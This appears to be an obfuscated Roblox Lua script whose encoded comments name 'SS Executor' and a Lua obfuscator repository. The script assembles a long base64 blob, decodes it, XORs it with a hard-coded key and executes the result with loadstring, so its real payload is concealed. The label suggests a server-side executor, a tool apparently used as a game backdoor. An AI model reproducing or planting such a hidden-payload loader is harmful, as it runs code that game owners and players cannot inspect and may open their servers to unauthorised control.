-- string.char(40,99,41,32,83,83,32,69,120,101,99,117,116,111,114,32,32,124,32,32,85,110,97,117,116,104,111,114,105,122,101,100,32,99,111,112,121,105,110,103,32,111,114,32,114,101,100,105,115,116,114,105,98,117,116,105,111,110,32,105,115,32,112,114,111,104,105,98,105,116,101,100,46)
-- string.char(83,111,117,114,99,101,58,32,103,105,116,104,117,98,46,99,111,109,47,114,111,98,108,111,120,115,99,114,105,112,116,101,114,54,50,52,53,51,54,54,53,52,50,47,114,111,98,108,111,120,45,108,117,97,45,111,98,115,99,97,116,111,114)

local _c=string.char;local _fc=string.find;local _sb=string.sub
local _tc=table.concat;local _mf=math.floor;local _ld=loadstring or load

local _K1={55,42,129,236,91,254,69,224,191,18,73,20,99,102,141,136}
local _K2={71,250,17,60,107,206,213,48,207,226,217,100,115,54,29,216}
local _K3={87,202,161,140,123,158,101,128,223,178,105,180,131,6,173,40}
local _K4={103,154,49,220,139,110,245,208,239,130,249,4,147,214,61,120}

local _K={}
for _,v in ipairs(_K1)do _K[#_K+1]=v end
for _,v in ipairs(_K2)do _K[#_K+1]=v end
for _,v in ipairs(_K3)do _K[#_K+1]=v end
for _,v in ipairs(_K4)do _K[#_K+1]=v end

local _A=_c(65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47)

local function _bd(_i)
    local _r,_v,_b={},0,0
    _i=_i:gsub('[^'.._A..'=]','')
    for _n=1,#_i do
        local _ch=_sb(_i,_n,_n)
        if _ch=='=' then break end
        local _p=_fc(_A,_ch,1,true)
        if not _p then break end
        _v=_v*64+(_p-1);_b=_b+6
        if _b>=8 then
            _b=_b-8
            _r[#_r+1]=_c(_mf(_v/2^_b)%256)
            _v=_v%(2^_b)
        end
    end
    return _tc(_r)
end

local function _xd(_d,_k)
    local _r,_kl={},#_k
    for _i=1,#_d do
        local _a,_bv=_d:byte(_i),_k[((_i-1)%_kl)+1]
        local _rs,_bt=0,1
        while _a>0 or _bv>0 do
            if _a%2~=_bv%2 then _rs=_rs+_bt end
            _a=_mf(_a/2);_bv=_mf(_bv/2);_bt=_bt*2
        end
        _r[_i]=_c(_rs)
    end
    return _tc(_r)
end

local _T={
'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'
}
local _P=_tc(_T)

local _fn,_er=_ld(_xd(_bd(_P),_K))
if not _fn then
    warn(string.char(91,83,83,32,69,120,101,99,117,116,111,114,93,32,76,111,97,100,32,101,114,114,111,114,58,32)..tostring(_er))
else
    _fn()
end
